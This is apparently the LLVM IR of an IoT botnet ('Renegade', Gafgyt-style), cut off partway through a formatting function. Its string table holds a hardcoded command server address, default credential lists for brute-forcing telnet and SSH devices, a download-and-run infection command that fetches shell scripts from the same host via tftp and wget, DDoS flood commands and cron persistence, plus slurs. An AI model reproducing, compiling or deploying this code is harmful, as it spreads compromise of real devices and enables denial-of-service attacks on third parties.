; ModuleID = 'host/ir_O0/Renegade.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i32, i16, i8* }
%struct.udphdr = type { %union.anon.3 }
%union.anon.3 = type { %struct.anon.4 }
%struct.anon.4 = type { i16, i16, i16, i16 }
%struct.anon.1 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.ifreq = type { %union.anon.6, %union.anon.7 }
%union.anon.6 = type { [16 x i8] }
%union.anon.7 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@commServer = global [1 x i8*] [i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str, i32 0, i32 0)], align 8
@.str = private unnamed_addr constant [21 x i8] c"94.140.120.196:23913\00", align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@gotIP = global i32 0, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@usernames = global [10 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.10, i32 0, i32 0)], align 16
@.str.1 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.3 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.4 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.5 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@.str.6 = private unnamed_addr constant [6 x i8] c"ubnt\00\00", align 1
@.str.7 = private unnamed_addr constant [8 x i8] c"telnet\00\00", align 1
@.str.8 = private unnamed_addr constant [8 x i8] c"D-Link\00\00", align 1
@.str.9 = private unnamed_addr constant [4 x i8] c"pi\00\00", align 1
@.str.10 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@passwords = global [18 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.10, i32 0, i32 0)], align 16
@.str.11 = private unnamed_addr constant [6 x i8] c"1234\00\00", align 1
@.str.12 = private unnamed_addr constant [7 x i8] c"12345\00\00", align 1
@.str.13 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@.str.14 = private unnamed_addr constant [10 x i8] c"dreambox\00\00", align 1
@.str.15 = private unnamed_addr constant [9 x i8] c"letmein\00\00", align 1
@.str.16 = private unnamed_addr constant [12 x i8] c"epicrouter\00\00", align 1
@.str.17 = private unnamed_addr constant [11 x i8] c"raspberry\00\00", align 1
@.str.18 = private unnamed_addr constant [10 x i8] c"changeme\00\00", align 1
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@scanPid = common global i32 0, align 4
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.85 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.19 = private unnamed_addr constant [9 x i8] c"buf: %s\0A\00", align 1
@fdopen_pids = internal global i32* null, align 8
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.20 = private unnamed_addr constant [14 x i8] c"/proc/cpuinfo\00", align 1
@.str.21 = private unnamed_addr constant [9 x i8] c"BOGOMIPS\00", align 1
@.str.22 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.23 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@ipState = internal global [5 x i8] zeroinitializer, align 1
@.str.24 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.25 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.26 = private unnamed_addr constant [9 x i8] c"assword:\00", align 1
@.str.27 = private unnamed_addr constant [5 x i8] c"user\00", align 1
@.str.28 = private unnamed_addr constant [5 x i8] c"pass\00", align 1
@.str.29 = private unnamed_addr constant [5 x i8] c"name\00", align 1
@.str.30 = private unnamed_addr constant [5 x i8] c"word\00", align 1
@.str.31 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.32 = private unnamed_addr constant [8 x i8] c"invalid\00", align 1
@.str.33 = private unnamed_addr constant [10 x i8] c"incorrect\00", align 1
@.str.34 = private unnamed_addr constant [5 x i8] c"fail\00", align 1
@.str.35 = private unnamed_addr constant [6 x i8] c"again\00", align 1
@.str.36 = private unnamed_addr constant [6 x i8] c"wrong\00", align 1
@.str.37 = private unnamed_addr constant [13 x i8] c"accessdenied\00", align 1
@.str.38 = private unnamed_addr constant [6 x i8] c"error\00", align 1
@.str.39 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@.str.40 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.41 = private unnamed_addr constant [193 x i8] c"cd /tmp || cd /var/run;rm -f ng.sh gchq.sh;tftp -r ng.sh -g 94.140.120.196;chmod +x ng.sh;sh ng.sh;rm -f ng.sh;wget -q http://94.140.120.196/gchq.sh;chmod +x gchq.sh;sh gchq.sh;rm -f gchq.sh\0D\0A\00", align 1
@.str.42 = private unnamed_addr constant [3 x i8] c"as\00", align 1
@.str.43 = private unnamed_addr constant [10 x i8] c"/bin/sh\0D\0A\00", align 1
@.str.44 = private unnamed_addr constant [13 x i8] c"shell exec\0D\0A\00", align 1
@.str.45 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.46 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.47 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.48 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.49 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.50 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.51 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.52 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.53 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.54 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.55 = private unnamed_addr constant [17 x i8] c"wget -O /tmp/fff\00", align 1
@.str.56 = private unnamed_addr constant [14 x i8] c" > /dev/null \00", align 1
@.str.57 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.58 = private unnamed_addr constant [14 x i8] c"FUCKINGFAGGOT\00", align 1
@.str.59 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.60 = private unnamed_addr constant [11 x i8] c"GETLOCALIP\00", align 1
@.str.61 = private unnamed_addr constant [10 x i8] c"My IP: %s\00", align 1
@.str.62 = private unnamed_addr constant [8 x i8] c"SCANNER\00", align 1
@.str.63 = private unnamed_addr constant [33 x i8] c"SCANNER SSH/TEL ON | SSH/TEL OFF\00", align 1
@.str.64 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.65 = private unnamed_addr constant [10 x i8] c"tel d0rk\0A\00", align 1
@.str.66 = private unnamed_addr constant [7 x i8] c"TEL ON\00", align 1
@.str.67 = private unnamed_addr constant [10 x i8] c"tel f0rk\0A\00", align 1
@.str.68 = private unnamed_addr constant [7 x i8] c"SSH ON\00", align 1
@.str.69 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.70 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.71 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.72 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.73 = private unnamed_addr constant [11 x i8] c"Killed %d.\00", align 1
@.str.74 = private unnamed_addr constant [13 x i8] c"None Killed.\00", align 1
@.str.75 = private unnamed_addr constant [13 x i8] c"LUCKYLILDUDE\00", align 1
@.str.76 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.77 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.78 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@main.ismokeweed = private unnamed_addr constant [50 x i8] c"/etc/cron.hourly/sockaddr\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00", align 16
@main.r00t3d = private unnamed_addr constant [11 x i8] c"shell exec\00", align 1
@.str.79 = private unnamed_addr constant [3 x i8] c"w+\00", align 1
@.str.80 = private unnamed_addr constant [13 x i8] c"fork failed\0A\00", align 1
@.str.81 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.82 = private unnamed_addr constant [8 x i8] c"FUCKYOU\00", align 1
@.str.83 = private unnamed_addr constant [14 x i8] c"GUCCILILNIGGA\00", align 1
@.str.84 = private unnamed_addr constant [2 x i8] c" \00", align 1

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %10

; <label>:10:                                     ; preds = %31, %1
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  br i1 %12, label %13, label %34

; <label>:13:                                     ; preds = %10
  %14 = load i32, i32* %3, align 4
  %15 = sub nsw i32 %14, 3
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %16
  %18 = load i32, i32* %17, align 4
  %19 = load i32, i32* %3, align 4
  %20 = sub nsw i32 %19, 2
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = xor i32 %18, %23
  %25 = xor i32 %24, -1640531527
  %26 = load i32, i32* %3, align 4
  %27 = xor i32 %25, %26
  %28 = load i32, i32* %3, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %29
  store i32 %27, i32* %30, align 4
  br label %31

; <label>:31:                                     ; preds = %13
  %32 = load i32, i32* %3, align 4
  %33 = add nsw i32 %32, 1
  store i32 %33, i32* %3, align 4
  br label %10

; <label>:34:                                     ; preds = %10
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  %27 = load i32, i32* @c, align 4
  %28 = icmp ult i32 %26, %27
  br i1 %28, label %29, label %34

; <label>:29:                                     ; preds = %0
  %30 = load i32, i32* %3, align 4
  %31 = add i32 %30, 1
  store i32 %31, i32* %3, align 4
  %32 = load i32, i32* @c, align 4
  %33 = add i32 %32, 1
  store i32 %33, i32* @c, align 4
  br label %34

; <label>:34:                                     ; preds = %29, %0
  %35 = load i32, i32* %4, align 4
  %36 = load i32, i32* %3, align 4
  %37 = sub i32 %35, %36
  %38 = load i32, i32* @rand_cmwc.i, align 4
  %39 = zext i32 %38 to i64
  %40 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %39
  store i32 %37, i32* %40, align 4
  ret i32 %37
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %19, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #10
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %22

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  br label %10

; <label>:22:                                     ; preds = %10
  br label %23

; <label>:23:                                     ; preds = %38, %22
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %24, %25
  br i1 %26, label %27, label %36

; <label>:27:                                     ; preds = %23
  %28 = load i8*, i8** %2, align 8
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = call i32 @isspace(i32 %33) #10
  %35 = icmp ne i32 %34, 0
  br label %36

; <label>:36:                                     ; preds = %27, %23
  %37 = phi i1 [ false, %23 ], [ %35, %27 ]
  br i1 %37, label %38, label %41

; <label>:38:                                     ; preds = %36
  %39 = load i32, i32* %5, align 4
  %40 = add nsw i32 %39, -1
  store i32 %40, i32* %5, align 4
  br label %23

; <label>:41:                                     ; preds = %36
  %42 = load i32, i32* %4, align 4
  store i32 %42, i32* %3, align 4
  br label %43

; <label>:43:                                     ; preds = %59, %41
  %44 = load i32, i32* %3, align 4
  %45 = load i32, i32* %5, align 4
  %46 = icmp sle i32 %44, %45
  br i1 %46, label %47, label %62

; <label>:47:                                     ; preds = %43
  %48 = load i8*, i8** %2, align 8
  %49 = load i32, i32* %3, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = load i8*, i8** %2, align 8
  %54 = load i32, i32* %3, align 4
  %55 = load i32, i32* %4, align 4
  %56 = sub nsw i32 %54, %55
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %53, i64 %57
  store i8 %52, i8* %58, align 1
  br label %59

; <label>:59:                                     ; preds = %47
  %60 = load i32, i32* %3, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %3, align 4
  br label %43

; <label>:62:                                     ; preds = %43
  %63 = load i8*, i8** %2, align 8
  %64 = load i32, i32* %3, align 4
  %65 = load i32, i32* %4, align 4
  %66 = sub nsw i32 %64, %65
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %63, i64 %67
  store i8 0, i8* %68, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #1

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %283, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %286

; <label>:17:                                     ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %274

; <label>:22:                                     ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %22
  br label %286

; <label>:30:                                     ; preds = %22
  %31 = load i8*, i8** %5, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 37
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %30
  br label %275

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %5, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 45
  br i1 %40, label %41, label %44

; <label>:41:                                     ; preds = %36
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %44

; <label>:44:                                     ; preds = %41, %36
  br label %45

; <label>:45:                                     ; preds = %50, %44
  %46 = load i8*, i8** %5, align 8
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 48
  br i1 %49, label %50, label %55

; <label>:50:                                     ; preds = %45
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i32 1
  store i8* %52, i8** %5, align 8
  %53 = load i32, i32* %8, align 4
  %54 = or i32 %53, 2
  store i32 %54, i32* %8, align 4
  br label %45

; <label>:55:                                     ; preds = %45
  br label %56

; <label>:56:                                     ; preds = %77, %55
  %57 = load i8*, i8** %5, align 8
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp sge i32 %59, 48
  br i1 %60, label %61, label %66

; <label>:61:                                     ; preds = %56
  %62 = load i8*, i8** %5, align 8
  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp sle i32 %64, 57
  br label %66

; <label>:66:                                     ; preds = %61, %56
  %67 = phi i1 [ false, %56 ], [ %65, %61 ]
  br i1 %67, label %68, label %80

; <label>:68:                                     ; preds = %66
  %69 = load i32, i32* %7, align 4
  %70 = mul nsw i32 %69, 10
  store i32 %70, i32* %7, align 4
  %71 = load i8*, i8** %5, align 8
  %72 = load i8, i8* %71, align 1
  %73 = zext i8 %72 to i32
  %74 = sub nsw i32 %73, 48
  %75 = load i32, i32* %7, align 4
  %76 = add nsw i32 %75, %74
  store i32 %76, i32* %7, align 4
  br label %77

; <label>:77:                                     ; preds = %68
  %78 = load i8*, i8** %5, align 8
  %79 = getelementptr inbounds i8, i8* %78, i32 1
  store i8* %79, i8** %5, align 8
  br label %56

; <label>:80:                                     ; preds = %66
  %81 = load i8*, i8** %5, align 8
  %82 = load i8, i8* %81, align 1
  %83 = zext i8 %82 to i32
  %84 = icmp eq i32 %83, 115
  br i1 %84, label %85, label %119

; <label>:85:                                     ; preds = %80
  %86 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %87 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 0
  %88 = load i32, i32* %87, align 8
  %89 = icmp ule i32 %88, 40
  br i1 %89, label %90, label %96

; <label>:90:                                     ; preds = %85
  %91 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 3
  %92 = load i8*, i8** %91, align 8
  %93 = getelementptr i8, i8* %92, i32 %88
  %94 = bitcast i8* %93 to i32*
  %95 = add i32 %88, 8
  store i32 %95, i32* %87, align 8
  br label %101

; <label>:96:                                     ; preds = %85
  %97 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 2
  %98 = load i8*, i8** %97, align 8
  %99 = bitcast i8* %98 to i32*
  %100 = getelementptr i8, i8* %98, i32 8
  store i8* %100, i8** %97, align 8
  br label %101

; <label>:101:                                    ; preds = %96, %90
  %102 = phi i32* [ %94, %90 ], [ %99, %96 ]
  %103 = load i32, i32* %102, align 4
  %104 = sext i32 %103 to i64
  %105 = inttoptr i64 %104 to i8*
  store i8* %105, i8** %11, align 8
  %106 = load i8**, i8*** %4, align 8
  %107 = load i8*, i8** %11, align 8
  %108 = icmp ne i8* %107, null
  br i1 %108, label %109, label %111

; <label>:109:                                    ; preds = %101
  %110 = load i8*, i8** %11, align 8
  br label %112

; <label>:111:                                    ; preds = %101
  br label %112

; <label>:112:                                    ; preds = %111, %109
  %113 = phi i8* [ %110, %109 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.85, i32 0, i32 0), %111 ]
  %114 = load i32, i32* %7, align 4
  %115 = load i32, i32* %8, align 4
  %116 = call i32 @prints(i8** %106, i8* %113, i32 %114, i32 %115)
  %117 = load i32, i32* %9, align 4
  %118 = add nsw i32 %117, %116
  store i32 %118, i32* %9, align 4
  br label %283

; <label>:119:                                    ; preds = %80
  %120 = load i8*, i8** %5, align 8
  %121 = load i8, i8* %120, align 1
  %122 = zext i8 %121 to i32
  %123 = icmp eq i32 %122, 100
  br i1 %123, label %124, label %149

; <label>:124:                                    ; preds = %119
  %125 = load i8**, i8*** %4, align 8
  %126 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %127 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 0
  %128 = load i32, i32* %127, align 8
  %129 = icmp ule i32 %128, 40
